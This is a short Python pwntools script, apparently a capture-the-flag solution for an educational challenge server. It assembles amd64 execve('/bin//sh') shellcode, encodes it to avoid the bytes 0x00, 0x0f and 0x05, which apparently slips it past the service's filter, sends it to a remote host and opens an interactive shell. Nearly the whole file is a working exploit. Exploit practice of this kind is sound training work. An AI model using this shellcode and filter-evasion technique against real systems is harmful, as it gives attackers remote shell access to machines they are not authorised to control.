#!/usr/bin/env python

from IPython import embed
from pwn import *

context.arch = 'amd64'

r = remote('edu-ctf.csie.org', 10150)
# r = remote('127.0.0.1', 7126)
r.recvuntil('shellcode >')
a = asm("""
        push 0x68
        mov rax, 0x732f2f2f6e69622f 
        push rax
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59
        syscall
                """)
aa = ['0x00', '0x0f', '0x05']
a = pwnlib.encoders.encoder.encode(a, avoid=aa, force=1)
# print(a)
# pause()
# a = pwnlib.encoders.encoder.encode(a, avoid='0x0f', force=1)
# a = pwnlib.encoders.encoder.encode(a, avoid='0x05', force=1)
# embed()
r.send(a)
r.interactive()
